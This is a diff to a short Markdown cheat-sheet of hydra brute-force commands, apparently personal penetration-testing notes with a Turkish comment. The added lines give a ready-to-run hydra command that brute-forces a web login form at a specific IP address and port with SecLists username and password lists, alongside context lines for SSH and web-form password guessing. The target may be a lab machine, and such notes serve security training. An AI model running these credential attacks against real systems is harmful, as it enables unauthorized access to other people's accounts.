@@ -40,5 +40,14 @@ hydra -C file ssh//10.10.1.1 -T4
 **brute force web login form**
 
 ```bash
+# S=success F='Invalid credentials'
 hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
 ```
+**responsede Invalid Credentials gördüğü sürece devam eder**
+```bash
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -f 154.57.164.77 -s 42219  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+```
+
+
+
